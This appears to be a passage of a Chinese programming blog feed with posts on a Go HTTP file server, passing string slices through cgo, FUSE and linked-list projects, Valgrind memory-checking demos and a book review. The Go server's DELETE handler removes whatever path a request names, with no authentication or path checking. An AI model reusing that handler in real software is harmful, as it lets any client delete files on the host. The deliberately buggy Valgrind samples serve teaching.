<p>开发文档意思是在http服务器添加handle来响应客户端不同请求操作即可，事例函数中有两个参数需要注意:</p>
<p><code>ResponseWriter 是处理器用来创建 HTTP 响应的接口，其源码结构如下所示：</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ResponseWriter <span class="keyword">interface</span> &#123;</span><br><span class="line">   <span class="comment">// 用于设置/获取所有响应头信息</span></span><br><span class="line">    Header() Header</span><br><span class="line">   <span class="comment">// 用于写入数据到响应实体</span></span><br><span class="line">    Write([]<span class="keyword">byte</span>) (<span class="keyword">int</span>, error)</span><br><span class="line">   <span class="comment">// 用于设置响应状态码</span></span><br><span class="line">    WriteHeader(statusCode <span class="keyword">int</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Request是用来解析请求头和请求体，其源码结构如下：</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Request <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">//指定请求内容例如DELETE，POST，GET</span></span><br><span class="line">    Method <span class="keyword">string</span></span><br><span class="line">	<span class="comment">//指定要请求的 URI（对于服务器请求）或要访问的 URL（用于客户请求</span></span><br><span class="line">    URL *url.URL</span><br><span class="line">	<span class="comment">//服务器协议版本</span></span><br><span class="line">    Proto      <span class="keyword">string</span> <span class="comment">// &quot;HTTP/1.0&quot;</span></span><br><span class="line">    ProtoMajor <span class="keyword">int</span>    <span class="comment">// 1</span></span><br><span class="line">    ProtoMinor <span class="keyword">int</span>    <span class="comment">// 0</span></span><br><span class="line">	<span class="comment">//包含服务端收到或者由客户端发送的 HTTP 请求头</span></span><br><span class="line">    Header Header</span><br><span class="line"></span><br><span class="line">    Body io.ReadCloser</span><br><span class="line"></span><br><span class="line">    GetBody <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="params">(io.ReadCloser, error)</span></span></span><br><span class="line"></span><br><span class="line">    ContentLength <span class="keyword">int64</span></span><br><span class="line"></span><br><span class="line">    TransferEncoding []<span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">    Close <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">    Host <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">    Form url.Values</span><br><span class="line"></span><br><span class="line">    PostForm url.Values</span><br><span class="line"></span><br><span class="line">    MultipartForm *multipart.Form</span><br><span class="line"></span><br><span class="line">    Trailer Header</span><br><span class="line"></span><br><span class="line">    RemoteAddr <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">    RequestURI <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">    TLS *tls.ConnectionState</span><br><span class="line"></span><br><span class="line">    Cancel &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    Response *Response</span><br><span class="line"></span><br><span class="line">    ctx context.Context</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这边主要使用的就是request结构体前几个对象就可以实现了，具体的其他对象详细说明可以看下<code>request.go</code>源码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mux := http.NewServeMux()</span><br><span class="line">    fs := http.FileServer(http.Dir(<span class="string">&quot;/home/mecry/tmp/&quot;</span>))</span><br><span class="line">    mux.Handle(<span class="string">&quot;/&quot;</span>, <span class="built_in">delete</span>(<span class="string">&quot;/home/mecry/tmp/&quot;</span>, fs))</span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;localhost:8888&quot;</span>, mux)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">delete</span> <span class="params">(dirprefix <span class="keyword">string</span>, next http.Handler)</span> <span class="title">http</span>.<span class="title">Handler</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> r.Method == <span class="string">&quot;DELETE&quot;</span> &#123;</span><br><span class="line">            path := dirprefix+r.URL.String()</span><br><span class="line">            fmt.Println(<span class="string">&quot;delete path:&quot;</span>, path)</span><br><span class="line">            os.Remove(path)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        next.ServeHTTP(w, r)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>windows技术</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】利用fuse实现简单文件系统</title>
    <url>/2021/09/16/%E5%88%A9%E7%94%A8fuse%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1 id="fuse实现原理"><a href="#fuse实现原理" class="headerlink" title="fuse实现原理"></a>fuse实现原理</h1><p><em><strong><a href="http://linkmecry.cn/2021/06/07/Linux%E4%B8%8Bfuse%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/">fuse原理</a></strong></em></p>
<span id="more"></span>

<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>周末抽了两个半天，看了下之前写的fuse总结，和之前用的httpdirfs项目中fuse实现,自己做了一个fuse的小程序，主要是对二级指针的深层次应用，源码路径<code>https://github.com/MecryWork/fuselocal</code>,功能如下</p>
<ol>
<li>实现多层次的文件和文件夹创建，重命名，删除</li>
</ol>
<p>待实现：</p>
<ol>
<li><p>文件的写入和读取（后期和服务器文件关联一下，本机的文件写入和读取有一些鸡肋）</p>
</li>
<li><p>合理的日志系统</p>
</li>
<li><p>文件创建的时间细节需要补充</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Linux利用fuse实现文件系统</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】cgo传入二级指针</title>
    <url>/2021/09/03/%E5%85%B3%E4%BA%8Ecgo%E7%9A%84%E4%BA%8C%E7%BA%A7%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<h1 id="cgo实现字符串切片传入c代码中"><a href="#cgo实现字符串切片传入c代码中" class="headerlink" title="cgo实现字符串切片传入c代码中"></a>cgo实现字符串切片传入c代码中</h1><p><em><strong>go实现字符串切片传入c代码中，让c识别为二级指针，能够顺利进行字符串的偏移读写</strong></em></p>
<span id="more"></span>

<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>想通过go给C代码传入一个二级指针，然后在C中进行读取，本来以为是很简单的事情，但是发现go的string和c++的不太一样，C的代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fill_2d_array</span><span class="params">(<span class="keyword">char</span> **arr, <span class="keyword">int</span> columeSize)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szBuf[<span class="number">4</span>][<span class="number">255</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++) &#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(szBuf[i], arr[i]);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;buf:%s\n&quot;</span>, szBuf[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="第一次转换的写法"><a href="#第一次转换的写法" class="headerlink" title="第一次转换的写法"></a>第一次转换的写法</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">byteToC</span><span class="params">(list []<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	dirs := <span class="built_in">make</span>([][]<span class="keyword">byte</span>, <span class="number">4</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ &#123;</span><br><span class="line">		dirs[i] = <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">4</span>)</span><br><span class="line">		dirs[i] = []<span class="keyword">byte</span>(list[i])</span><br><span class="line">		fmt.Println(<span class="string">&quot;list:&quot;</span>, list[i])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	C.fill_2d_array((**C.char)(unsafe.Pointer(&amp;dirs[<span class="number">0</span>][<span class="number">0</span>])), C.<span class="keyword">int</span>(<span class="number">5</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把切片转成byte传入C的代码中，但是在C代码输出的时候直接输出直接崩溃，如果按照字节处理<code>strcpy((char*)(arr+0*sizeof(char)*columeSize), &quot;hello&quot;);</code>类似这种处理，但是在C中输出的时候，字符串会或多或少，不能正常输出。</p>
<p>根因分析：之前我写过go转C++的dll，导出头文件关于GoString的定义为</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> GO_CGO_GOSTRING_TYPEDEF</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="keyword">const</span> <span class="keyword">char</span>* p; <span class="keyword">ptrdiff_t</span> n; &#125; _GoString_;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>这边我直接输出了<code>printf(&quot;%s&quot;,goString.p);</code>，然后是一串很长的字符串，详情看如何生成dll的请移步<a href="http://linkmecry.cn/2021/06/04/go%E6%90%AD%E5%BB%BAhttp%E6%9C%8D%E5%8A%A1%E5%99%A8/">利用go搭建纯文件http服务器，并生成dll</a>，这边判断gostring中的p在转换的时候没有保存’\0’，意思就是没有结束符，把后面的东西全部都输出了</p>
<h3 id="第二次转换的写法"><a href="#第二次转换的写法" class="headerlink" title="第二次转换的写法"></a>第二次转换的写法</h3><p>问题找到了，只需要把’\0’在传入的时候传过去就OK，于是放弃转byte的转换方法，改用C.char*.</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">charToC</span><span class="params">(list []<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	nameunits := <span class="built_in">make</span>([]*C.char, <span class="built_in">len</span>(list))</span><br><span class="line">	<span class="keyword">for</span> i, _ := <span class="keyword">range</span> list &#123;</span><br><span class="line">		nameunits[i] = C.CString(list[i])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	C.fill_2d_array((**C.char)(unsafe.Pointer(&amp;nameunits[<span class="number">0</span>])), C.<span class="keyword">int</span>(<span class="number">4</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出正常圆满完成任务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">buf:1111</span><br><span class="line">buf:2222</span><br><span class="line">buf:3333</span><br><span class="line">buf:4444</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】利用C++实现链表</title>
    <url>/2021/09/03/%E9%93%BE%E8%A1%A8%E5%9F%BA%E7%A1%80%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="利用C-实现链表基础代码"><a href="#利用C-实现链表基础代码" class="headerlink" title="利用C++实现链表基础代码"></a>利用C++实现链表基础代码</h1><p><em><strong>利用C++实现链表和CString<code>https://github.com/MecryWork/listapp</code>。</strong></em></p>
<span id="more"></span>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ol>
<li>实现增删改查插入</li>
<li>CString实现深拷贝</li>
</ol>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】Valgrind检测内存泄露的学习和使用</title>
    <url>/2021/08/17/Valgrind%E5%AD%A6%E4%B9%A0%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Valgrind的学习和使用"><a href="#Valgrind的学习和使用" class="headerlink" title="Valgrind的学习和使用"></a>Valgrind的学习和使用</h1><p><em><strong>Valgrind 是一个 GPL 系统，用于调试和分析 Linux 程序。使用 Valgrind 的 工具，可以自动检测许多内存管理和线程错误。</strong></em></p>
<span id="more"></span>
<h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><ol>
<li><p>uos/debian/ubuntu</p>
<blockquote>
<p>sudo apt install valgrind</p>
</blockquote>
</li>
<li><p>源码安装</p>
<p> 官网<code>http://www.valgrind.org</code></p>
<p> <img src="/2021/08/17/Valgrind%E5%AD%A6%E4%B9%A0%E5%8F%8A%E4%BD%BF%E7%94%A8/1.png" alt="图1"></p>
<blockquote>
<p>./autogen.sh</p>
</blockquote>
<blockquote>
<p>./configure</p>
</blockquote>
<blockquote>
<p>make &amp;&amp; install</p>
</blockquote>
</li>
</ol>
<h2 id="实现逻辑"><a href="#实现逻辑" class="headerlink" title="实现逻辑"></a>实现逻辑</h2><ol>
<li><p>内存泄露主要使用<code>Memcheck</code>,官网介绍</p>
<p> <img src="/2021/08/17/Valgrind%E5%AD%A6%E4%B9%A0%E5%8F%8A%E4%BD%BF%E7%94%A8/2.png" alt="图2"></p>
</li>
</ol>
<p>解释：</p>
<ul>
<li>建立表来存储进程的地址空间，当要读写内存某个字节时，首先检查对此字节对应表的A bit，如果不存在，memcheck 则报告读写错误</li>
<li>内核（core）类似于一个虚拟的 CPU 环境，这样当内存中的某个字节被加载到真实的 CPU 中时，该字节对应的 V bit (在 valid-value map 中) 也被加载到虚拟的 CPU 环境中。一旦寄存器中的值，被用来产生内存地址，或者该值能够影响程序输出，则 memcheck 会检查对应的 V bits，如果该值尚未初始化，则会报告使用未初始化内存错误</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="example1：内存未释放"><a href="#example1：内存未释放" class="headerlink" title="example1：内存未释放"></a>example1：内存未释放</h3><blockquote>
<p>valgrind –leak-check=yes ./main</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *p = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>));<span class="comment">//未释放</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	func();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D; Memcheck, a memory error detector</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D; Copyright (C) 2002-2017, and GNU GPL&#39;d, by Julian Seward et al.</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D; Using Valgrind-3.14.0 and LibVEX; rerun with -h for copyright info</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D; Command: .&#x2F;main</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D; HEAP SUMMARY:</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;     in use at exit: 1 bytes in 1 blocks</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;   total heap usage: 1 allocs, 0 frees, 1 bytes allocated</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D; 1 bytes in 1 blocks are definitely lost in loss record 1 of 1</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;    at 0x483577F: malloc (vg_replace_malloc.c:299)</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;    by 0x401133: func (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho1&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;    by 0x401148: main (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho1&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D; LEAK SUMMARY:</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;    definitely lost: 1 bytes in 1 blocks</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;    indirectly lost: 0 bytes in 0 blocks</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;      possibly lost: 0 bytes in 0 blocks</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;    still reachable: 0 bytes in 0 blocks</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;         suppressed: 0 bytes in 0 blocks</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D; For counts of detected and suppressed errors, rerun with: -v</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D; ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 0 from 0)</span><br></pre></td></tr></table></figure>

<p>终端输出很清楚,一次获取新内存，0次释放，共有0字节为释放，然后就自动定位你未释放的地方<code>==19112==    at 0x483577F: malloc (vg_replace_malloc.c:299)</code>这句话不用看，是c底层库的东西<code>==19112==    by 0x401133: func (in /home/mecry/dde-c/metho/metho1/main)</code>这句直接指明是<code>func()</code>函数有内存泄露</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D; HEAP SUMMARY:</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;     in use at exit: 1 bytes in 1 blocks</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;   total heap usage: 1 allocs, 0 frees, 1 bytes allocated</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D; 1 bytes in 1 blocks are definitely lost in loss record 1 of 1</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;    at 0x483577F: malloc (vg_replace_malloc.c:299)</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;    by 0x401133: func (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho1&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;19112&#x3D;&#x3D;    by 0x401148: main (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho1&#x2F;main)</span><br></pre></td></tr></table></figure>


<h3 id="example1：越界"><a href="#example1：越界" class="headerlink" title="example1：越界"></a>example1：越界</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *a = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	a[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	a[<span class="number">0</span>] = <span class="number">1</span>; <span class="comment">//已释放再定义</span></span><br><span class="line">	<span class="built_in">free</span>(a);  <span class="comment">//已释放再释放</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	func();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; Memcheck, a memory error detector</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; Copyright (C) 2002-2017, and GNU GPL&#39;d, by Julian Seward et al.</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; Using Valgrind-3.14.0 and LibVEX; rerun with -h for copyright info</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; Command: .&#x2F;main</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; Invalid write of size 4</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    at 0x401162: func (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401184: main (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;  Address 0x4a31040 is 0 bytes inside a block of size 4 free&#39;d</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    at 0x48369AB: free (vg_replace_malloc.c:530)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x40115D: func (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401184: main (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;  Block was alloc&#39;d at</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    at 0x483577F: malloc (vg_replace_malloc.c:299)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401143: func (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401184: main (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; Invalid free() &#x2F; delete &#x2F; delete[] &#x2F; realloc()</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    at 0x48369AB: free (vg_replace_malloc.c:530)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401173: func (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401184: main (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;  Address 0x4a31040 is 0 bytes inside a block of size 4 free&#39;d</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    at 0x48369AB: free (vg_replace_malloc.c:530)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x40115D: func (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401184: main (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;  Block was alloc&#39;d at</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    at 0x483577F: malloc (vg_replace_malloc.c:299)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401143: func (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401184: main (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; HEAP SUMMARY:</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;     in use at exit: 0 bytes in 0 blocks</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;   total heap usage: 1 allocs, 2 frees, 4 bytes allocated</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; All heap blocks were freed -- no leaks are possible</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; For counts of detected and suppressed errors, rerun with: -v</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; ERROR SUMMARY: 2 errors from 2 contexts (suppressed: 0 from 0)</span><br></pre></td></tr></table></figure>

<p>写入未定义的四个字节</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; Invalid write of size 4</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    at 0x401162: func (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401184: main (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;  Address 0x4a31040 is 0 bytes inside a block of size 4 fre</span><br><span class="line">e&#39;d</span><br></pre></td></tr></table></figure>

<p>释放未定义的四个字节</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D; Invalid free() &#x2F; delete &#x2F; delete[] &#x2F; realloc()</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    at 0x48369AB: free (vg_replace_malloc.c:530)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401173: func (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;    by 0x401184: main (in &#x2F;home&#x2F;mecry&#x2F;dde-c&#x2F;metho&#x2F;metho2&#x2F;main)</span><br><span class="line">&#x3D;&#x3D;27268&#x3D;&#x3D;  Address 0x4a31040 is 0 bytes inside a block of size 4 free&#39;d</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【读书有感】谈谈《王朔的短篇小说》</title>
    <url>/2021/08/01/%E7%8E%8B%E6%9C%94%E7%9A%84%E7%9F%AD%E7%AF%87/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><em><strong>打败你自己的只有你自己，其他人只能使你强大</strong></em></p>
<span id="more"></span>

<p>在我18年时特别迷姜文的电影和他的采访，电影是期期不落，采访的没被封的基本上都看过了，在姜文的侧面熏陶下间接的知道了王朔这个人，知道他也是一名《顽主》。从此便记下了想闲下来找他的几篇小说瞅瞅，不想一拖就是两年，说实话还是挺讽刺的上学的时候没时间看上班了为了生活还，为了充实所谓的精神世界对他的小说狂买了一通，没想到竟爱不释手。看完之后，真没想这本竟是90年代的小说，大为通透。其中大部分的小说都拍成了电影，没拍的说明不能拍或者是现在不让放了。只能引用他自己采访的一句话，<strong>我对写作是有天赋的，是生来就会不需要灵感</strong></p>
